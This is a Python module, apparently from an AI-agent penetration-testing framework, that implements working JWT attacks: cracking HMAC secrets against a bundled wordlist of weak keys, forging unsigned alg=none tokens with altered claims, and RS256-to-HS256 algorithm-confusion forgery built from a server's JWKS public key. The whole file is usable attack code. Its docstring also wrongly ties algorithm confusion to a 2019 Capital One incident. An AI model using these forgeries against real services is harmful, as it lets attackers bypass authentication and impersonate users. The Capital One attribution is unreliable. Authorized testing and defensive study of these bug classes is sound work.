"""Dependency-free JWT parsing/forging toolkit — no pyjwt, no cryptography.

Plain functions only, no @tool decoration and no network calls — a helper
module for skills/auth_mapper.py (the actual @tool entrypoint that sends
requests), same relationship tools/response_fingerprint.py has to it.
Neither this file nor response_fingerprint.py belongs in
agent/orchestrator.py's ALL_TOOLS — see skills/hitl_batcher.py for the
established precedent of a non-tool helper module living under skills/.

Every "crack"/"forge" function here mirrors a real, well-known JWT
vulnerability class:
  - jwt_crack_weak_secret: HMAC secret is a common/guessable string.
  - jwt_forge_alg_none: server accepts an unsigned token if `alg` says so.
  - jwt_forge_alg_confusion: server's RS256 verifier is naively reused for
    HS256 too, so signing with the server's OWN public key bytes (as an
    HMAC secret) produces a signature the verifier accepts — the same
    class of bug behind the 2019 Capital One JWT research chain.
Nothing here sends a request — skills/auth_mapper.py forges a token with
these functions, then replays it via tools/http_client.py and judges the
result. That separation keeps this file testable without a network.
"""
import base64
import hashlib
import hmac
import json

_WEAK_SECRETS = [
    "secret", "password", "123456", "changeme", "key", "admin", "jwt_secret",
    "your-256-bit-secret", "test", "qwerty", "secret123", "letmein",
    "supersecret", "default", "apikey", "dev", "development", "staging",
    "production", "null", "123456789", "",
]

# Fixed algorithm-identifier bytes for rsaEncryption, per X.509
# SubjectPublicKeyInfo: SEQUENCE { OID 1.2.840.113549.1.1.1, NULL }.
_RSA_ALG_ID = bytes.fromhex("300d06092a864886f70d0101010500")


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def jwt_parts(token: str) -> tuple[dict, dict, bytes]:
    """Parse a JWT into (header, payload, signature_bytes) WITHOUT verifying it."""
    header_b64, payload_b64, sig_b64 = token.split(".")
    header = json.loads(b64url_decode(header_b64))
    payload = json.loads(b64url_decode(payload_b64))
    signature = b64url_decode(sig_b64) if sig_b64 else b""
    return header, payload, signature


def _signing_input(header: dict, payload: dict) -> str:
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}"


def jwt_crack_weak_secret(token: str, wordlist: list[str] | None = None) -> str | None:
    """Offline HMAC dictionary attack against a token's own signature. None if none match."""
    signing_input, sig_b64 = token.rsplit(".", 1)
    target_sig = b64url_decode(sig_b64)
    for candidate in (wordlist or _WEAK_SECRETS):
        computed = hmac.new(candidate.encode(), signing_input.encode(), hashlib.sha256).digest()
        if hmac.compare_digest(computed, target_sig):  # constant-time: this is itself a crack routine
            return candidate
    return None


def jwt_forge_alg_none(payload: dict, header: dict | None = None) -> str:
    """Build an unsigned (alg=none) token with an arbitrary payload."""
    header = {**(header or {}), "alg": "none", "typ": "JWT"}
    return _signing_input(header, payload) + "."


def jwt_tamper_claims(token: str, claim_overrides: dict) -> str:
    """Take a real token's header+payload, override claims, re-sign as alg=none."""
    header, payload, _ = jwt_parts(token)
    return jwt_forge_alg_none({**payload, **claim_overrides}, header)


def jwt_sign_hs256(header: dict, payload: dict, secret: bytes) -> str:
    header = {**header, "alg": "HS256"}
    signing_input = _signing_input(header, payload)
    sig = hmac.new(secret, signing_input.encode(), hashlib.sha256).digest()
    return f"{signing_input}.{b64url_encode(sig)}"


def _der_length(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    body = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(body)]) + body


def _der_integer(value_bytes: bytes) -> bytes:
    value_bytes = value_bytes.lstrip(b"\x00") or b"\x00"
    if value_bytes[0] & 0x80:  # top bit set -> would read as negative, pad with 0x00
        value_bytes = b"\x00" + value_bytes
    return b"\x02" + _der_length(len(value_bytes)) + value_bytes


def _der_sequence(*children: bytes) -> bytes:
    body = b"".join(children)
    return b"\x30" + _der_length(len(body)) + body


def _der_bit_string(data: bytes) -> bytes:
    body = b"\x00" + data  # leading byte = number of unused bits in the last octet (0)
    return b"\x03" + _der_length(len(body)) + body


def jwks_to_pem(jwk: dict) -> bytes:
    """Convert a JWKS RSA public-key entry ({"n": ..., "e": ...}, base64url) to a PEM
    SubjectPublicKeyInfo block, hand-building the DER ASN.1 structure — no
    `cryptography`/`pyjwt` dependency needed for the algorithm-confusion attack below.
    """
    rsa_public_key = _der_sequence(
        _der_integer(b64url_decode(jwk["n"])),
        _der_integer(b64url_decode(jwk["e"])),
    )
    spki = _der_sequence(_RSA_ALG_ID, _der_bit_string(rsa_public_key))
    b64 = base64.b64encode(spki).decode()
    body = "\n".join(b64[i:i + 64] for i in range(0, len(b64), 64))
    return f"-----BEGIN PUBLIC KEY-----\n{body}\n-----END PUBLIC KEY-----\n".encode()


def jwt_forge_alg_confusion(token: str, rsa_public_pem: bytes, claim_overrides: dict | None = None) -> str:
    """RS256 -> HS256 algorithm-confusion forgery: HMAC-sign using the server's OWN
    RSA public key PEM bytes as the HMAC secret. Only a real bypass if the
    server's verifier trusts the token's own `alg` header rather than pinning
    it to what that key was actually issued for.
    """
    header, payload, _ = jwt_parts(token)
    return jwt_sign_hs256(header, {**payload, **(claim_overrides or {})}, rsa_public_pem)
